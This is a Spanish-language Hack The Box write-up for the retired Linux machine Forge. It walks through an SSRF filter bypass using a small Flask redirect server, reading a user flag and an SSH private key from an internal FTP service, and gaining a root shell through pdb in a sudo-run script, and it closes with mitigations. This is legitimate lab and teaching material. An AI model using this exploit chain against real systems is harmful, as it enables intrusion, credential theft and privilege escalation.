---
machine: Forge
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, ssrf, ftp, ssh, pdb]
---

# Forge — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La web permite subir imágenes desde una URL y filtra palabras como `admin` y `127.0.0.1`. Un servidor propio devuelve un redirect a `admin.forge.htb`, que el cliente sigue y salta el filtro. El panel admin tiene otro SSRF que consulta el FTP interno; de ahí salen la flag de usuario y una clave SSH. La escalada usa `pdb.post_mortem` en un script ejecutado con `sudo`.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22/tcp` OpenSSH en Ubuntu 20.04 y `80/tcp` Apache con `forge.htb`.
- `21/tcp` aparece filtrado: el FTP existe, pero solo es accesible desde localhost.
- `admin.forge.htb` responde que solo se puede visitar desde localhost.

## Enumeración

- `/upload` acepta un archivo local o una URL; la respuesta guarda el contenido en `/uploads/<id>`.
- El backend usa `python-requests`, así que sigue redirecciones HTTP por defecto.
- El filtro bloquea `admin`, `localhost` y `127.0.0.1`, pero no un dominio externo que redirija.

## Foothold

Se levanta un Flask que responde `302` hacia `http://admin.forge.htb/`. La web lo pide, sigue el redirect y devuelve el panel admin. Ese panel permite consultar el FTP local; se piden `/user.txt` y `/home/user/.ssh/id_rsa`.

```python
from flask import Flask, redirect
app = Flask(__name__)
@app.route("/")
def go():
    return redirect("http://admin.forge.htb/")
app.run(host="0.0.0.0", port=80)
```

La clave se usa para entrar por SSH como `user`.

## Movimiento lateral

No hay otro host. El movimiento es de la web al FTP interno, del FTP a la clave SSH y de ahí al usuario `user` del sistema.

## Escalada de privilegios

`sudo -l` permite `/usr/bin/python3 /opt/remote-manage.py`. El script escucha en un puerto aleatorio, pide una contraseña y convierte la opción del menú con `int()`. Si se envía texto no numérico, lanza `ValueError` y entra en `pdb.post_mortem`, donde se puede importar `os` y ejecutar una shell.

```bash
sudo /usr/bin/python3 /opt/remote-manage.py
# En otra sesión:
nc 127.0.0.1 <PORT>
# Contraseña, luego una opción no numérica:
0xdf
# En el prompt de pdb:
import os; os.system("/bin/bash")
```

## Evidencia

- Panel admin cargado a través del redirect externo.
- Listado FTP con `user.txt` y `id_rsa`.
- Prompt de `pdb` y shell como root.

## Lecciones aprendidas

- Un filtro de palabras no equivale a una allowlist de destinos.
- Un SSRF puede encadenarse con un redirect para alcanzar servicios internos.
- Un depurador interactivo en un proceso privilegiado es ejecución de código.

## Mitigación y detección

- Resolver la URL y validar el destino final contra una allowlist.
- Bloquear redirects y acceso a rangos internos desde el fetch del servidor.
- No dejar `pdb` en scripts de producción ni ejecutarlos con privilegios.

## Referencias

- [0xdf — Forge](https://0xdf.gitlab.io/2022/01/22/htb-forge.html)
- [IppSec — Forge](https://www.youtube.com/watch?v=-BL4uevhERg)
- [Hack The Box — Forge](https://app.hackthebox.com/machines/forge)
